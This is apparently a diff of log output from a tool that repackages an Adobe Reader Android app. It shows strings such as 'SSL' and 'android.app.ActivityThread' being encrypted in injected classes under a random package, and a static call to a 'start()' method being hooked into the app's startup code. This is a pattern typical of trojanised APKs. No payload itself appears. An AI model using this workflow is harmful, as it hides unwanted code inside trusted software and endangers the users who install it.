-removed '/workspace/temp/mqohafcqjycjjuwcjfsbvzhcbhifppcw.stub'
-removed '/workspace/temp/mturlhzsrwmichlgbsuvcrkjfauermmk.stub'
-removed '/workspace/temp/nihurowdbdatkqvvxmtczzebllvpmhme.stub'
-removed '/workspace/temp/ohdiesekciubjoirrrhuuaiqkapgynxb.stub'
-removed '/workspace/temp/tebptesvdbddhgnmprlaxgmvunhnkedx.stub'
-removed '/workspace/temp/tehziiaminhojkwfcranrlgwxabcdaln.stub'
-removed '/workspace/temp/xprckqpvazdsyfqtpaesvxvljvoqsuiz.stub'
-removed '/workspace/temp/yiinjvcltybdvlfrxrhrtyzdeywxrvbw.stub'
-removed '/workspace/temp/zhmvcrurvcawmbgrxjsmnvnxbybzhnrv.stub'
-removed '/workspace/temp/zwqfbkziclhhweerryzlryufbnwmyhsi.stub'
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/bgbszabsghncmjiwikktbmzrpbaowrcz.stub'
+Placeholder: ngeiuxubuuuqdlbxmxmwttbjbexmrjld
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/f.smali:37
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/f.smali
+Line num: 37
+Target: "SSL"
+Reg: v1
+Stripped target: SSL
+Replacement: tcmFaYkKrtwrCssVrkfoPe91Ng==
+
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/ngeiuxubuuuqdlbxmxmwttbjbexmrjld.stub'
+Placeholder: mnginvdmehsmwisawbfhpucgcyjyvmev
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/f.smali:114
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/f.smali
+Line num: 114
+Target: "SHA-1"
+Reg: v3
+Stripped target: SHA-1
+Replacement: riwYycTTe7OiG9XKVujiXpJ/b4HH
+
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/mnginvdmehsmwisawbfhpucgcyjyvmev.stub'
+Placeholder: eiizbibztzclezpfawrnbhndwrixonwo
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/f.smali:140
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/f.smali
+Line num: 140
+Target: "Invalid certificate"
+Reg: v1
+Stripped target: Invalid certificate
+Replacement: rlYoKRaBDcvBKkDMxf5wpsok/hfyXzSw/+qu2hnZr/9S6KI=
+
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/eiizbibztzclezpfawrnbhndwrixonwo.stub'
+Placeholder: qudmdfgocimlnafadmsyhxmglltkwrgc
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Yjmyl.smali:18
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Yjmyl.smali
+Line num: 18
+Target: "android.app.ActivityThread"
+Reg: v0
+Stripped target: android.app.ActivityThread
+Replacement: vAs3n6TCHE8NsQ7SW4sch9VLhDZp5p9RtJq8atou8nkJAOWPfXWVewFz
+
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/qudmdfgocimlnafadmsyhxmglltkwrgc.stub'
+Placeholder: mvetlzzntxtltbctotpganhenlbuwakf
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Yjmyl.smali:28
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Yjmyl.smali
+Line num: 28
+Target: "currentApplication"
+Reg: v1
+Stripped target: currentApplication
+Replacement: 8A7zxlQfut0dPM17yjdYEy5pHhJBjx/0ZJVvFqveRuY/Gg==
+
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/mvetlzzntxtltbctotpganhenlbuwakf.stub'
+removed '/workspace/temp/afrhqtkamharlruelhmplecvvzaygbqv.stub'
+removed '/workspace/temp/anxoakxcupujcpscljhegslcgybsapkc.stub'
+removed '/workspace/temp/bgbszabsghncmjiwikktbmzrpbaowrcz.stub'
+removed '/workspace/temp/bnjhxqcfsblnfnhbyxhosshkaubtnbyu.stub'
+removed '/workspace/temp/eiizbibztzclezpfawrnbhndwrixonwo.stub'
+removed '/workspace/temp/eyeczmbkcvcqinefiwcrxnndwweedugn.stub'
+removed '/workspace/temp/fwkmgioysoiylntjrpulafmaivfvqeoh.stub'
+removed '/workspace/temp/gwarfkvsuzwnqxqdczzneujnhdaqjzha.stub'
+removed '/workspace/temp/iswofhehypcnrnnoywtpxjvnvesldciy.stub'
+removed '/workspace/temp/iwmwkwfswfizggrevysqcbqxztcxorha.stub'
+removed '/workspace/temp/jzanqwgnajhnemxestgtxnyahlzlmkik.stub'
+removed '/workspace/temp/kodgrnaxxzzrginptzhdoshlfmwcatrl.stub'
+removed '/workspace/temp/mnginvdmehsmwisawbfhpucgcyjyvmev.stub'
+removed '/workspace/temp/mvetlzzntxtltbctotpganhenlbuwakf.stub'
+removed '/workspace/temp/ngeiuxubuuuqdlbxmxmwttbjbexmrjld.stub'
+removed '/workspace/temp/pjqgnwmfduxfzqqgvqivvmwhiivenvzq.stub'
+removed '/workspace/temp/ppyypxqrkotlfjzshrhuzorgdjtutbcs.stub'
+removed '/workspace/temp/qudmdfgocimlnafadmsyhxmglltkwrgc.stub'
+removed '/workspace/temp/ramiznqzaxyraweayurdgblbxuzqnztq.stub'
+removed '/workspace/temp/slvpvhfqlchrevtceljfyzywcgcgzxoq.stub'
+removed '/workspace/temp/umqtqcqsgdbyflvtiuqggggriqqoxibm.stub'
+removed '/workspace/temp/vbcoaayxtofdkyibmwdzajhgtpgljlsv.stub'
+removed '/workspace/temp/vjgfbaxtmxamkfkwyehbcahjsqqsipsh.stub'
+removed '/workspace/temp/wfgjjiverehqrotwqdtdlvgrjhggieug.stub'
+removed '/workspace/temp/xxcuzualmrmchjsusfcaydyigakkurmf.stub'
+removed '/workspace/temp/zegzqkdxjdvrfwlrerskqeiharxhcqik.stub'
 removed '/workspace/temp/placeholders.txt'
     sput-boolean v0, Lcom/adobe/reader/misc/ARApp;->sIsModal:Z
 
-    invoke-static {}, Lcom/adobe/reader/czaen/Bhfbf;->start()V
+    invoke-static {}, Lcom/adobe/reader/dnfws/Yjmyl;->start()V
 The smali file was hooked successfully
 I: Using Apktool 2.6.0
 I: Checking whether sources has changed...
